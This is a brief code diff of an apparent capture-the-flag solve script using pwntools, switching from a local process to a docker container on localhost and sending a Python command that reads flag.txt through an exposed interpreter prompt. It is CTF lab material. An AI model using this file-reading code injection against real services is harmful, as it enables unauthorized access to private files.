@@ -1,6 +1,8 @@
 from pwn import *
 
-conn = process("server.py") # use remote(HOST, PORT) for remote solve
+# conn = process("server.py") # use remote(HOST, PORT) for remote solve
+conn = remote("localhost", 7331) # testing with my docker
+
 command = "print(open('flag.txt').read())"
 
 conn.recvuntil(">>>")
